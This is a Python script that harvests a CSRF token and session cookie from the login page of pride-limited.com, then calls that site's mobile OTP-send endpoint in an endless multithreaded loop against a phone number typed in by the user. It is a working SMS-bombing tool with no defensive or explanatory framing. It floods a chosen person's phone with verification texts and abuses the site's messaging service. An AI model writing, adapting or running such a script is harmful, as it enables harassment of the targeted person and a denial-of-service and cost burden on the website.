import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# API URLs
login_url = "https://pride-limited.com/login"
otp_url = "https://pride-limited.com/mobile/otp/send"

# Total requests counter
total_requests = 0

def fetch_csrf_and_session():
    """Fetch CSRF token and session ID."""
    response = requests.get(login_url)
    soup = BeautifulSoup(response.content, 'html.parser')

    # Extract CSRF token
    csrf_meta = soup.find('meta', attrs={'name': 'csrf-token'})
    csrf_token = csrf_meta['content'] if csrf_meta else None

    # Extract session cookie
    cookies = response.cookies.get_dict()
    session_id = cookies.get('pride_limited_session')

    if not csrf_token or not session_id:
        raise Exception("Error: Could not retrieve CSRF token or session cookie.")

    return csrf_token, session_id

def send_request(csrf_token, session_id, mobile):
    """Send a single OTP request."""
    global total_requests
    headers = {
        "Host": "pride-limited.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-CSRF-Token": csrf_token,
        "Cookie": f"pride_limited_session={session_id}"
    }

    payload = {
        "_token": csrf_token,
        "login_user_id": '',
        "mobile_no": mobile
    }

    try:
        response = requests.post(otp_url, headers=headers, data=payload)
        if response.status_code == 200:
            total_requests += 1  # Increment the counter for successful requests
            print(f"[api_4] [{total_requests}] : {response.status_code}")
        else:
            print(f"Request failed: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

def main(mobile, threads):
    """Main function to send multiple requests."""
    try:
        csrf_token, session_id = fetch_csrf_and_session()
    except Exception as e:
        print(e)
        return

    with ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            futures = [executor.submit(send_request, csrf_token, session_id, mobile) for _ in range(threads)]
            for future in futures:
                future.result()

if __name__ == "__main__":
    mobile = input("Enter mobile number: ")
    threads = int(input("Threads(1-50): "))
    main(mobile, threads)